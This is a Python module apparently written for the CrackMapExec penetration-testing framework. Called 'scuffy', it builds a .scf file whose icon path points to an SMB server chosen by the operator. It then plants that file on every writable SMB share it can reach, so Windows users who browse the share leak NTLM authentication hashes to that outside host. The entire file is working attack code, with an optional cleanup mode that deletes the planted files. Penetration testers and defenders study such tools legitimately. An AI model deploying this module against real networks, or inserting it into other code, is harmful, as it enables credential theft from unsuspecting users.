#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ntpath
from sys import exit


class CMEModule:
    """
    Original idea and PoC by Mubix "Rob" Fuller
    URL: https://room362.com/post/2016/smb-http-auth-capture-via-scf/
    Module by: @kierangroome
    """

    name = "scuffy"
    description = "Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.cleanup = None
        self.server = None
        self.file_path = None
        self.scf_path = None
        self.scf_name = None

    def options(self, context, module_options):
        """
        SERVER      IP of the SMB server
        NAME        SCF file name
        CLEANUP     Cleanup (choices: True or False)
        """
        self.cleanup = False

        if "CLEANUP" in module_options:
            self.cleanup = bool(module_options["CLEANUP"])

        if "NAME" not in module_options:
            context.log.fail("NAME option is required!")
            exit(1)

        if not self.cleanup and "SERVER" not in module_options:
            context.log.fail("SERVER option is required!")
            exit(1)

        self.scf_name = module_options["NAME"]
        self.scf_path = f"/tmp/{self.scf_name}.scf"
        self.file_path = ntpath.join("\\", f"{self.scf_name}.scf")

        if not self.cleanup:
            self.server = module_options["SERVER"]
            scuf = open(self.scf_path, "a")
            scuf.write(f"[Shell]\n")
            scuf.write(f"Command=2\n")
            scuf.write(f"IconFile=\\\\{self.server}\\share\\icon.ico\n")
            scuf.close()

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if "WRITE" in share["access"] and share["name"] not in [
                "C$",
                "ADMIN$",
                "NETLOGON",
            ]:
                context.log.success(f"Found writable share: {share['name']}")
                if not self.cleanup:
                    with open(self.scf_path, "rb") as scf:
                        try:
                            connection.conn.putFile(share["name"], self.file_path, scf.read)
                            context.log.success(f"Created SCF file on the {share['name']} share")
                        except Exception as e:
                            context.log.fail(f"Error writing SCF file to share {share['name']}: {e}")
                else:
                    try:
                        connection.conn.deleteFile(share["name"], self.file_path)
                        context.log.success(f"Deleted SCF file on the {share['name']} share")
                    except Exception as e:
                        context.log.fail(f"Error deleting SCF file on share {share['name']}: {e}")
